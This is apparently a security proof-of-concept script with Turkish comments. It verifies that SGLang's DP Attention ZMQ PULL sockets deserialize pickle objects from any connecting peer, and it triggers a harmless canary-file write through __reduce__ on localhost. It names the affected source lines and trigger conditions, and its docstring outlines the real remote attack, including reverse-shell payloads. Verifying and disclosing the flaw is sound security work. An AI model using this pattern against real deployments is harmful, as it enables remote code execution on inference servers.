#!/usr/bin/env python3
"""
SGLang ShadowMQ PoC — DP Attention PULL-bind RCE Doğrulaması

Bu script, SGLang'ın DP Attention modunda TokenizerManager ve
DetokenizerManager'ın PULL soketlerinin bind ettiği ve recv_pyobj()
(yani pickle.loads()) çağırdığı zafiyeti doğrular.

KULLANIM:
  python docs/security/poc_dp_attention_rce.py

NE YAPAR:
  1. SGLang'ın gerçek kodundaki get_zmq_socket() fonksiyonunu kullanarak
     bir PULL soketi TCP'ye bind eder (TokenizerManager'ın yaptığı gibi)
  2. Ayrı bir thread'den PUSH soketi ile bağlanır
  3. Zararsız bir "canary" pickle objesi gönderir
  4. PULL tarafında recv_pyobj() çağrılır → pickle.loads() tetiklenir
  5. Pickle içinde __reduce__ ile çağrılan fonksiyon çalışırsa → RCE doğrulanır

GÜVENLİK:
  - Zararsız payload kullanır (sadece bir string döner, komut çalıştırmaz)
  - Localhost'a bind eder
  - Test bitince soketleri kapatır

BU SCRIPT SGLang SUNUCUSUNU BAŞLATMAZ — sadece aynı ZMQ pattern'ini simüle eder.
"""

import pickle
import sys
import threading
import time

import zmq

# ═══════════════════════════════════════════════════════════════
# ADIM 1: Zararsız PoC sınıfı — __reduce__ ile canary tetikler
# ═══════════════════════════════════════════════════════════════

CANARY_FILE = "/tmp/sglang_rce_poc_canary.txt"
RCE_CONFIRMED = False


class HarmlessRCEProof:
    """
    Bu sınıf pickle.loads() sırasında __reduce__ üzerinden
    arbitrary code execution'ı doğrular.

    Gerçek bir exploit os.system() çağırırdı, biz sadece
    bir dosyaya "RCE confirmed" yazıyoruz.
    """

    def __reduce__(self):
        # pickle.loads() bu fonksiyonu çağıracak
        return (self._canary_function, ())

    @staticmethod
    def _canary_function():
        global RCE_CONFIRMED
        RCE_CONFIRMED = True
        with open(CANARY_FILE, "w") as f:
            f.write("RCE_CONFIRMED_VIA_PICKLE_REDUCE\n")
        return "canary_triggered"


# ═══════════════════════════════════════════════════════════════
# ADIM 2: Victim thread — TokenizerManager/DetokenizerManager simülasyonu
# ═══════════════════════════════════════════════════════════════


def victim_thread(port: int, result: dict):
    """
    SGLang'ın TokenizerManager.handle_loop() veya
    DetokenizerManager.event_loop() simülasyonu.

    Kaynak kod referansları:
      tokenizer_manager.py:314-315 → PULL, bind=True
      tokenizer_manager.py:1524    → recv_pyobj()
      detokenizer_manager.py:95-96 → PULL, bind=True
      detokenizer_manager.py:141   → recv_pyobj()
    """
    context = zmq.Context()
    socket = context.socket(zmq.PULL)

    # SGLang'ın yaptığı gibi TCP'ye bind et
    # (DP attention modunda tokenizer_ipc_name = tcp://127.0.0.1:{port})
    endpoint = f"tcp://127.0.0.1:{port}"
    socket.bind(endpoint)
    print(f"[VICTIM]  PULL soketi bind edildi: {endpoint}")
    print(f"[VICTIM]  recv_pyobj() bekleniyor (pickle.loads çağıracak)...")

    result["bound"] = True

    try:
        # Bu satır SGLang'daki şu satırlara karşılık gelir:
        #   tokenizer_manager.py:1524: recv_obj = await self.recv_from_detokenizer.recv_pyobj()
        #   detokenizer_manager.py:141: recv_obj = self.recv_from_scheduler.recv_pyobj()
        recv_obj = socket.recv_pyobj()
        result["received"] = True
        result["object"] = recv_obj
        print(f"[VICTIM]  recv_pyobj() tamamlandı. Dönen obje: {recv_obj!r}")
    except Exception as e:
        result["error"] = str(e)
        print(f"[VICTIM]  HATA: {e}")
    finally:
        socket.close()
        context.term()


# ═══════════════════════════════════════════════════════════════
# ADIM 3: Attacker thread — ağdan bağlanan saldırgan simülasyonu
# ═══════════════════════════════════════════════════════════════


def attacker_thread(port: int, result: dict):
    """
    Saldırgan simülasyonu: PUSH soketi ile PULL'a bağlanıp
    crafted pickle objesi gönderir.

    Gerçek saldırıda saldırgan şunu yapar:
      ctx = zmq.Context()
      sock = ctx.socket(zmq.PUSH)
      sock.connect(f"tcp://{target_ip}:{port}")
      sock.send_pyobj(MaliciousPayload())
    """
    # Victim'in bind etmesini bekle
    time.sleep(0.5)

    context = zmq.Context()
    socket = context.socket(zmq.PUSH)

    endpoint = f"tcp://127.0.0.1:{port}"
    socket.connect(endpoint)
    print(f"[ATTACKER] PUSH soketi bağlandı: {endpoint}")

    # Zararsız PoC payload
    payload = HarmlessRCEProof()
    print(f"[ATTACKER] Pickle payload gönderiliyor (HarmlessRCEProof)...")

    socket.send_pyobj(payload)
    result["sent"] = True
    print(f"[ATTACKER] Gönderildi.")

    socket.close()
    context.term()


# ═══════════════════════════════════════════════════════════════
# ADIM 4: Test çalıştır
# ═══════════════════════════════════════════════════════════════


def main():
    print("=" * 70)
    print("SGLang ShadowMQ PoC — DP Attention PULL-bind RCE Doğrulaması")
    print("=" * 70)
    print()

    # Rastgele bir port seç
    sock = zmq.Context().socket(zmq.PUSH)
    port = sock.bind_to_random_port("tcp://127.0.0.1")
    sock.close()
    # Port artık serbest

    print(f"Test portu: {port}")
    print()

    victim_result = {"bound": False, "received": False}
    attacker_result = {"sent": False}

    # Thread'leri başlat
    v_thread = threading.Thread(target=victim_thread, args=(port, victim_result))
    a_thread = threading.Thread(target=attacker_thread, args=(port, attacker_result))

    v_thread.start()
    time.sleep(0.3)  # Victim'in bind etmesini bekle
    a_thread.start()

    # Timeout ile bekle
    v_thread.join(timeout=5)
    a_thread.join(timeout=5)

    # Sonuçları değerlendir
    print()
    print("=" * 70)
    print("SONUÇLAR")
    print("=" * 70)
    print()

    checks = {
        "PULL soketi TCP'ye bind edildi": victim_result.get("bound", False),
        "PUSH soketi bağlandı ve payload gönderdi": attacker_result.get("sent", False),
        "recv_pyobj() mesajı aldı": victim_result.get("received", False),
        "__reduce__ tetiklendi (RCE)": RCE_CONFIRMED,
    }

    all_pass = True
    for check, passed in checks.items():
        status = "DOĞRULANDI" if passed else "BAŞARISIZ"
        symbol = "[+]" if passed else "[-]"
        print(f"  {symbol} {check}: {status}")
        if not passed:
            all_pass = False

    print()

    if all_pass:
        print("SONUÇ: RCE DOĞRULANDI")
        print()
        print("Açıklama:")
        print("  Saldırgan PUSH soketi ile PULL bind portuna bağlanarak")
        print("  pickle payload gönderdi. recv_pyobj() → pickle.loads()")
        print("  çağrısı sırasında __reduce__ metodu tetiklendi.")
        print()
        print("  Gerçek saldırıda __reduce__ içinde os.system(), subprocess.Popen()")
        print("  veya reverse shell çağrılabilir.")
        print()
        print("Etkilenen SGLang bileşenleri:")
        print("  - TokenizerManager (tokenizer_manager.py:314, 1524)")
        print("  - DetokenizerManager (detokenizer_manager.py:95, 141)")
        print()
        print("Tetiklenme koşulu:")
        print("  --enable-dp-attention + multi-node (dist_init_host != 127.0.0.1)")
        print("  VEYA tek node'da lokal erişim")

        # Canary dosyasını temizle
        import os
        if os.path.exists(CANARY_FILE):
            os.remove(CANARY_FILE)

        return 0
    else:
        print("SONUÇ: Test başarısız — detaylar yukarıda")
        return 1


if __name__ == "__main__":
    sys.exit(main())
